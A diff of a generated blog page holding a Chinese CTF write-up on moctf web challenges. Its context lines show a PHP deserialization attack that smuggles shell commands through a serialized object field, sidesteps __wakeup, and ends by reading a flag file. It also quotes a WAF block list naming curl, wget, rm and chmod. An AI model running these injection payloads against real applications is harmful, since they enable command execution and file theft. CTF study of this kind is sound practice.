@@ -27,7 +27,7 @@
 <meta property="og:image" content="https://s1.ax1x.com/2018/03/18/9oluIP.png">
 <meta property="og:image" content="https://s1.ax1x.com/2018/03/18/9olnat.png">
 <meta property="og:image" content="https://s1.ax1x.com/2018/03/18/9olMPf.png">
-<meta property="og:updated_time" content="2018-05-20T02:20:57.417Z">
+<meta property="og:updated_time" content="2018-05-20T06:35:09.058Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="简单小结一下moctf的两道web题">
 <meta name="twitter:description" content="本人渣渣，于是记录一下">
@@ -112,7 +112,7 @@
         </hgroup>
 
         
-        <p class="header-subtitle">学习本无底，前进莫彷徨！</p>
+        <p class="header-subtitle">学习本无底，前进莫彷徨</p>
         
 
         
@@ -207,7 +207,7 @@
               <h1 class="header-author"><a href="/" title="回到主页">0verWatch&#39;s Blog</a></h1>
             </hgroup>
             
-            <p class="header-subtitle">学习本无底，前进莫彷徨！</p>
+            <p class="header-subtitle">学习本无底，前进莫彷徨</p>
             
             <nav class="header-menu">
                 <ul>
@@ -320,7 +320,7 @@
 <p>发现这段代码还有个waf.php，再来一次发现不行了，那就先构造一波吧<br>首先我们发现system函数，这里可以利用，但是在<code>__call()</code>函数里面，我们应该知道<code>__call()</code>函数应该在类里面调用一个未定义的函数的时候使用<br>这里是利用bag参数去实现这一功能，毕竟到了Get_air_drops()函数里面我们就会调用一个没定义的函数了，因为bag参数对于我们而言是可控的<br>而在调用__call函数的时候，method变量对应就是bag参数的值了。。。。</p>
 <p>所以我们先构造类</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sheldon</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $bag=<span class="string">"//win.php &amp;&amp; whoami &amp;&amp; index"</span>;    <span class="comment">//这里的index是为了闭合后面的.php</span></span><br><span class="line">        <span class="keyword">public</span> $weapon=<span class="string">"AWM"</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $b = <span class="keyword">new</span> sheldon();</span><br><span class="line">       $a = serialize($b);</span><br><span class="line">       <span class="keyword">echo</span> $a;</span><br><span class="line">       <span class="keyword">echo</span> urlencode($a);                <span class="comment">//记得URL编码上次校赛的坑现在还是记得的。。。。。</span></span><br></pre></td></tr></table></figure>
-<p>你问我为什么bag要以win.php开头？<br>看看这里就知道了，这一句表明肯定有这样的一个文件，我直接构造就好了<br><a href="https://imgchr.com/i/9oluIP" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/03/18/9oluIP.png" alt="9oluIP.png"></a></p>
+<p>你问我为什么bag要以win.php开头？<br>看看这里就知道了，这一句表明肯定有这样的一个文件，我直接构造就好了<br><a href="http://imgchr.com/i/9oluIP" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/03/18/9oluIP.png" alt="9oluIP.png"></a></p>
 <p>这里的$a参数出来的是下面的东西<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;sheldon&quot;:2:&#123;s:3:&quot;bag&quot;;s:28:&quot;//win.php &amp;&amp; whoami &amp;&amp; index&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
 <p>但是在反序列化的时候会自动调用<strong>wakeup()函数，从而导致了构造的类里面的变量重定义了，这就会导致失败了<br>所以我们还得绕过</strong>wakeup()函数<br>所以我们就改成这样</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;sheldon&quot;:20:&#123;s:3:&quot;bag&quot;;s:28:&quot;//win.php &amp;&amp; whoami &amp;&amp; index&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125;</span><br></pre></td></tr></table></figure>
@@ -330,7 +330,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sheldon</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $bag=<span class="string">"/win.php &amp;&amp; sort waf"</span>;  </span><br><span class="line">        <span class="keyword">public</span> $weapon=<span class="string">"AWM"</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $b = <span class="keyword">new</span> sheldon();</span><br><span class="line">       $a = serialize($b);</span><br><span class="line">       <span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure>
 <p>出现一段代码，自己拼接一下吧<br>得到</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">       $black = <span class="keyword">array</span>(<span class="string">'vi'</span>,<span class="string">'awk'</span>,<span class="string">'-'</span>,<span class="string">'sed'</span>,<span class="string">'comm'</span>,<span class="string">'diff'</span>,<span class="string">'grep'</span>,<span class="string">'cp'</span>,<span class="string">'mv'</span>,<span class="string">'nl'</span>,<span class="string">'less'</span>,<span class="string">'od'</span>,<span class="string">'head'</span>,<span class="string">'tail'</span>,<span class="string">'more'</span>,<span class="string">'tac'</span>,<span class="string">'rm'</span>,<span class="string">'ls'</span>,<span class="string">'tailf'</span>,<span class="string">'%'</span>,<span class="string">'%0a'</span>,<span class="string">'%0d'</span>,<span class="string">'%00'</span>,<span class="string">'ls'</span>,<span class="string">'echo'</span>,<span class="string">'ps'</span>,<span class="string">'&gt;'</span>,<span class="string">'&lt;'</span>,<span class="string">'$&#123;IFS&#125;'</span>,<span class="string">'ifconfig'</span>,<span class="string">'mkdir'</span>,<span class="string">'cp'</span>,<span class="string">'chmod'</span>,<span class="string">'wget'</span>,<span class="string">'curl'</span>,<span class="string">'http'</span>,<span class="string">'www'</span>,<span class="string">'`'</span>,<span class="string">'printf'</span>);</span><br><span class="line">        $black = []; </span><br><span class="line">         <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($values)</span></span>&#123; </span><br><span class="line">         	 <span class="keyword">foreach</span> ($black <span class="keyword">as</span> $key =&gt; $value) &#123;  <span class="keyword">if</span>(stripos($values,$value))&#123;<span class="keyword">die</span>(<span class="string">"Attack!"</span>); &#125; &#125;</span><br><span class="line"></span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure>
-<p>发现我们可以用bash的特性绕过<br><a href="https://imgchr.com/i/9olnat" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/03/18/9olnat.png" alt="9olnat.png"></a></p>
+<p>发现我们可以用bash的特性绕过<br><a href="http://imgchr.com/i/9olnat" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/03/18/9olnat.png" alt="9olnat.png"></a></p>
 <p>再改一下payload</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sheldon</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $bag=<span class="string">"/win.php &amp;&amp; l\s &amp;&amp; index"</span>;    /</span><br><span class="line">        <span class="keyword">public</span> $weapon=<span class="string">"AWM"</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $b = <span class="keyword">new</span> sheldon();</span><br><span class="line">       $a = serialize($b);</span><br><span class="line">       <span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure>
 <p>得到一堆文件列表名</p>
@@ -339,7 +339,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/app </span><br><span class="line">/app/class </span><br><span class="line">/app/class/win.php </span><br><span class="line">/app/class/flag.php </span><br><span class="line">/app/image </span><br><span class="line">/app/image/PUBG.jpg </span><br><span class="line">/app/index.php.bak </span><br><span class="line">/app/waf.php </span><br><span class="line">/app/class.php </span><br><span class="line">/app/class.php.bak </span><br><span class="line">/app/index.php</span><br></pre></td></tr></table></figure>
 <p>最后发现应该在flag.php里面<br>于是最后改payload</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;sheldon&quot;:20:&#123;s:3:&quot;bag&quot;;s:45:&quot;/win.php &amp;&amp; sort /app/class/flag.php &amp;&amp; index&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125;</span><br></pre></td></tr></table></figure>
-<p>得到flag<br><a href="https://imgchr.com/i/9olMPf" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/03/18/9olMPf.png" alt="9olMPf.png"></a></p>
+<p>得到flag<br><a href="http://imgchr.com/i/9olMPf" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/03/18/9olMPf.png" alt="9olMPf.png"></a></p>
 
       
     </div>
@@ -351,7 +351,7 @@
         <p><span>本文标题:</span><a href="/2018/03/06/moctfweb/">简单小结一下moctf的两道web题</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">0verWatch&#39;s Blog</a></p>
         <p><span>发布时间:</span>2018-03-06, 23:14:34</p>
-        <p><span>最后更新:</span>2018-05-20, 10:20:57</p>
+        <p><span>最后更新:</span>2018-05-20, 14:35:09</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2018/03/06/moctfweb/" title="简单小结一下moctf的两道web题">http://0verwatch.top/2018/03/06/moctfweb/</a>
             <span class="copy-path" data-clipboard-text="原文: http://0verwatch.top/2018/03/06/moctfweb/　　作者: 0verWatch&#39;s Blog" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
